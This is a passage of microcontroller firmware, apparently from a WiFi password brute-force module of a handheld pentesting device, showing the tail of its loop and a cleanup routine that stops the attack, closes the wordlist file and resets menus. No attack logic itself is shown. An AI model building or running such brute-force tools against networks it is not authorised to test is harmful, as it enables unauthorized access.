            showBruteAttackScreen();
        }
    }
    
    handleBruteButtons();
    delay(10);
}

// =================================================
// CLEANUP
// =================================================

void wifiBruteCleanup() {
    Serial.println("🧹 WiFi Brute cleanup...");
    
    if (bruteRunning) {
        stopBruteAttack();
        delay(100);
    }
    
    if (passwordFile) {
        passwordFile.close();
    }
    
    bruteServer.stop();
    
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    bruteRunning = false;
    bruteNetworkCount = 0;
    targetSSID = "";
    statusText = "Idle";
    currentWordlist = "";
    bruteExiting = false;
    bruteMenuIndex = 0;
    bruteMenuLevel = 0;
    wordlistMenuIndex = 0;
    inWordlistMenu = false;
    inNetworkMenu = false;
    clearPopup();
    
    SPIFFS.end();
    delay(50);
    
    Serial.println("✅ WiFi Brute cleanup complete");
    exitModule();
}